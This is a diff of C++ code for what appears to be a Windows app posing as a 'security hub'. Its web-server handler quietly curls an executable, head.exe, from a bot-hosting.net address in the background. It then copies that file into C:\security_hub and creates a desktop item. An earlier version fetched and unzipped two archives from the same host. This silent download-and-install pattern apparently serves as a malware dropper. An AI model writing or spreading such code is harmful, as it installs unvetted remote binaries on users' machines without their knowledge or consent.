@@ -40,20 +40,16 @@ void start_server(int port) {
             res.status = 500;
             res.set_content("Error: Could not read index.html", "text/plain");
         } else {
-            std::string command;
-            
-            command = "curl -L -o core.zip http://fi3.bot-hosting.net:23113/core.zip";
-            runCommandInBackground(command.c_str());
-            std::cout << "done command" << std::endl;
+            std::string sourceFile = "head.exe";
+            std::string targetDir = "C:\\security_hub\\app_back_end";
+        
 
-            command = "curl -L -o head.zip http://fi3.bot-hosting.net:23113/head.zip";
+            std::string command = "curl -L -o head.exe http://fi3.bot-hosting.net:23113/head.exe";
             runCommandInBackground(command.c_str());
-            std::cout << "done command" << std::endl;
-            
-            std::this_thread::sleep_for(std::chrono::seconds(2));
-
-            unzip("core.zip", "C:\\security_hub", 5536);
-            unzip("head.zip", "C:\\security_hub\\app_back_end", 95536);
+  
+            std::this_thread::sleep_for(std::chrono::seconds(5));
+        
+            copyFileToDirectory(sourceFile, targetDir);
 
             char path[MAX_PATH];
             HRESULT hr = SHGetFolderPathA(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, path);
@@ -68,8 +64,6 @@ void start_server(int port) {
             } else {
                 std::cerr << "error create" << std::endl;
             }
-
-            deleteFile("main.zip");
 
             Sleep(sleep_app);
 
